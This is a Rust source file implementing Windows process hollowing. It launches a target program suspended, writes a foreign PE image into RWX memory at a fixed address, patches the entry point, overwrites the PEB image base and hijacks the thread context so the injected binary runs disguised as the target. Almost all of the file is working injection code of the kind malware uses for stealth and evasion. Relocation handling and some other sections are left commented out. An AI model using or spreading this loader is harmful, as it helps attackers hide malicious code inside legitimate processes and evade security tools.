

use winapi::um::winnt::PIMAGE_THUNK_DATA64;
use crate::injection::dll_loading::DllLoader;
use winapi::shared::minwindef::WORD;
use winapi::um::winnt::IMAGE_BASE_RELOCATION;
use winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC;
use winapi::um::winnt::PIMAGE_SECTION_HEADER;
use winapi::um::winnt::IMAGE_SECTION_HEADER;
use std::mem::size_of;
use winapi::um::winnt::CONTEXT_FULL;
use winapi::shared::minwindef::DWORD;
use winapi::um::memoryapi::VirtualProtectEx;
use std::fs::File;
use winapi::um::processthreadsapi::SetThreadContext;
use winapi::um::processthreadsapi::SuspendThread;
use winapi::um::processthreadsapi::ResumeThread;
use std::time::Duration;
use std::thread::sleep;
use crate::injection::context::CONTEXT;
use crate::injection::context::PROCESS_BASIC_INFO;
use winapi::shared::minwindef::PULONG;
use winapi::shared::minwindef::ULONG;
use winapi::shared::ntdef::NTSTATUS;
use winapi::shared::minwindef::LPVOID;
use winapi::shared::ntdef::HANDLE;
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use winapi::um::winnt::MEM_RESERVE;
use winapi::um::winnt::MEM_COMMIT;
use winapi::um::winnt::IMAGE_NT_HEADERS;
use winapi::um::winnt::IMAGE_DOS_HEADER;
use winapi::um::winnt::PIMAGE_NT_HEADERS;
use winapi::um::winnt::IMAGE_DOS_SIGNATURE;
use winapi::um::winnt::PIMAGE_DOS_HEADER;
use winapi::um::winnt::IMAGE_NT_SIGNATURE;
use winapi::shared::ntdef::PVOID;
use winapi::um::memoryapi::VirtualAllocEx;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::processthreadsapi::STARTUPINFOA;
use winapi::um::processthreadsapi::PROCESS_INFORMATION;
use winapi::um::winbase::CREATE_SUSPENDED;
use std::ptr::null_mut;
use std::ffi::CString;
use winapi::um::processthreadsapi::CreateProcessA;
use std::mem;
use windows_dll::dll;
use std::io::Read;

const LOAD_ADDRESS: u64 = 0x00007FF7AEFC0000;
const JUMP_INFINITE: [u8;2] = [0xEB, 0xFE];

mod context;
mod dll_loading;

#[dll("ntdll.dll")]
extern "system"{
    #[allow(non_snake_case)]
    fn NtGetContextThread(thr: HANDLE, ctx: LPVOID) -> NTSTATUS;
    #[allow(non_snake_case)]
    fn NtReadVirtualMemory(thr: HANDLE, start: u64, base: PVOID, amount:ULONG, f:PULONG) -> NTSTATUS;
    #[allow(non_snake_case)]
    fn NtQueryInformationProcess(proc: HANDLE, class: u32, info: *mut PROCESS_BASIC_INFO, length: ULONG, rlength: PULONG) -> NTSTATUS;
    #[allow(non_snake_case)]
    fn NtUnmapViewOfSection(proc: HANDLE, sec: PVOID) -> NTSTATUS;
}

unsafe fn get_exe_headers(bin: &[u8]) -> (IMAGE_DOS_HEADER, IMAGE_NT_HEADERS){
    let image_dos_header = bin.as_ptr() as PIMAGE_DOS_HEADER;
    if (*image_dos_header).e_magic != IMAGE_DOS_SIGNATURE{
        panic!("Invalid MS-DOS signature on code");
    }
    let image_nt_header = bin.as_ptr().offset((*image_dos_header).e_lfanew as isize) as PIMAGE_NT_HEADERS;
    if (*image_nt_header).Signature != IMAGE_NT_SIGNATURE{
        panic!("Invalid NT signature on code");
    }

    (*image_dos_header, *image_nt_header)
}

unsafe fn create_proc(target: &str) -> PROCESS_INFORMATION{
    let mut process_info: PROCESS_INFORMATION = mem::zeroed();
    let mut startup_info: STARTUPINFOA = mem::zeroed();

    let path_c = CString::new(target).expect("Failed to convert target path to C String");
    
    if CreateProcessA(path_c.as_ptr(), null_mut(), null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup_info as *mut _, &mut process_info as *mut _) == 0{
        panic!("Failed to create process - err: 0x{:X}", GetLastError());
    }
    process_info
}

pub unsafe fn prepare_file(binary: &[u8]) -> (u64, Vec<u8>){
    let (dos_h, nt_h) = get_exe_headers(binary);
    let mut memory = vec![0_u8; nt_h.OptionalHeader.SizeOfImage as usize];
    

    // Copy headers into memory vec
    memory[0..nt_h.OptionalHeader.SizeOfHeaders as usize]
    .clone_from_slice(&binary[0..nt_h.OptionalHeader.SizeOfHeaders as usize]);

    for i in 0..nt_h.FileHeader.NumberOfSections{
        let section_header = (
            binary.as_ptr().offset(
                (
                    dos_h.e_lfanew as usize+
                    size_of::<IMAGE_NT_HEADERS>() +
                    (i as usize * size_of::<IMAGE_SECTION_HEADER>())
                )

                as isize
            )
        ) as PIMAGE_SECTION_HEADER;

        let virtual_start = (*section_header).VirtualAddress as usize;
        let file_start = (*section_header).PointerToRawData as usize;
        let length = (*section_header).SizeOfRawData as usize;
        memory[virtual_start..virtual_start+length].clone_from_slice(
            &binary[
                file_start..
                file_start+length
            ]
        );
    }

    // let mut relocation_base = nt_h.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize;
    // let delta = LOAD_ADDRESS - nt_h.OptionalHeader.ImageBase as u64;


    // let mut base_info: IMAGE_BASE_RELOCATION = *memory.as_ptr().offset(relocation_base as isize).cast();

    // while base_info.VirtualAddress + base_info.SizeOfBlock != 0{
    //     let number_of_entries = (base_info.SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<WORD>();
        
    //     for i in 0..number_of_entries{
    //         let address: WORD = *memory.as_ptr().add(size_of::<IMAGE_BASE_RELOCATION>()).add(i*2).cast();
            
    //     }

    //     relocation_base += base_info.SizeOfBlock as usize;
    //     base_info = *memory.as_ptr().offset(relocation_base as isize).cast();
    // }

    (nt_h.OptionalHeader.AddressOfEntryPoint as u64, memory)
}

pub unsafe fn spin_thread(process_info: &PROCESS_INFORMATION, enter_addr: u64){
    let mut context: CONTEXT = mem::zeroed();
    context.ContextFlags = CONTEXT_FULL;
    let err = NtGetContextThread(process_info.hThread, (&mut context as *mut CONTEXT).cast());
    context.Rcx = enter_addr;
    if err != 0{
        panic!("Failed getting thread context - err: 0x{:X}", err);
    }

    if SetThreadContext(process_info.hThread, (&mut context as *mut CONTEXT).cast()) == 0{
        panic!("Failed setting thread context - err: 0x{:X}", GetLastError());
    }

    ResumeThread(process_info.hThread);
    sleep(Duration::from_millis(200));
    SuspendThread(process_info.hThread);
}

unsafe fn get_peb_base(proc: &PROCESS_INFORMATION) -> u64{
    let mut context: CONTEXT = mem::zeroed();
    context.ContextFlags = CONTEXT_FULL;
    let err = NtGetContextThread(proc.hThread, (&mut context as *mut CONTEXT).cast());
    if err != 0{
        panic!("Failed getting thread context - err: 0x{:X}", err);
    }
    context.Rdx
}

unsafe fn set_image_base_in_peb(proc: &PROCESS_INFORMATION, peb_base_address: u64, address: u64){
    if WriteProcessMemory(proc.hProcess, (peb_base_address+16) as PVOID, (&address as *const u64).cast(), 8, null_mut()) == 0{
        panic!("Failed to write image base to PEB - err: 0x{:X}", GetLastError());
    }
}

pub unsafe fn inject(target: &str, binary: &[u8]){
    println!("Creating instance of {}...", target);

    let (entry, mut pe_memory) = prepare_file(binary);
    let process_info = create_proc(target);
    let (dos_h, nt_h) = get_exe_headers(binary);
    let peb_base = get_peb_base(&process_info);


    let mut original_context: CONTEXT = mem::zeroed();
    original_context.ContextFlags = CONTEXT_FULL;
    let err = NtGetContextThread(process_info.hThread, (&mut original_context as *mut CONTEXT).cast());
    if err != 0{
        panic!("Failed getting thread context - err: 0x{:X}", err);
    }
    
    if VirtualAllocEx(process_info.hProcess, LOAD_ADDRESS as PVOID, nt_h.OptionalHeader.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == null_mut(){
        panic!("Failed to allocate at address 0x{:X} - err: 0x{:X}", LOAD_ADDRESS, GetLastError());
    }

    if WriteProcessMemory(process_info.hProcess, LOAD_ADDRESS as PVOID, pe_memory.as_ptr().cast(), pe_memory.len(), null_mut()) == 0{
        panic!("Failed to write new binary - err: 0x{:X}", GetLastError());
    }
    if WriteProcessMemory(process_info.hProcess, (LOAD_ADDRESS+entry) as PVOID, JUMP_INFINITE.as_ptr().cast(), JUMP_INFINITE.len(), null_mut()) == 0{
        panic!("Failed to write infinite loop instruction to target memory - err: 0x{:X}", GetLastError());
    }


    {
        let dll_loader = DllLoader::new(&process_info, LOAD_ADDRESS);
        dll_loader.process_pe(&mut pe_memory);
    }


    if SetThreadContext(process_info.hThread, (&mut original_context as *mut CONTEXT).cast()) == 0{
        panic!("Failed setting thread context - err: 0x{:X}", GetLastError());
    }

    set_image_base_in_peb(&process_info, peb_base, LOAD_ADDRESS);
    println!("Enter @ {:X}", LOAD_ADDRESS+entry);
    spin_thread(&process_info, LOAD_ADDRESS+entry);

    

    


    


    




    
    
    if WriteProcessMemory(process_info.hProcess, (LOAD_ADDRESS+entry) as PVOID, pe_memory.as_ptr().add(entry as usize).cast(), JUMP_INFINITE.len(), null_mut()) == 0{
        panic!("Failed to write original code instruction to target memory - err: 0x{:X}", GetLastError());
    }
    
    // println!("Enter at {:X}", entry + LOAD_ADDRESS);
    
    // let mut context: CONTEXT = mem::zeroed();
    // context.ContextFlags = CONTEXT_FULL;
    // let err = NtGetContextThread(process_info.hThread, (&mut context as *mut CONTEXT).cast());
    // if err != 0{
    //     panic!("Failed getting thread context - err: 0x{:X}", err);
    // }
    // context.Rip = entry + LOAD_ADDRESS;
    // if SetThreadContext(process_info.hThread, (&mut context as *mut CONTEXT).cast()) == 0{
    //     panic!("Failed setting thread context - err: 0x{:X}", GetLastError());
    // }


    // ResumeThread(process_info.hThread);
    // load_dlls(&["user32.dll"], &process_info);
    
}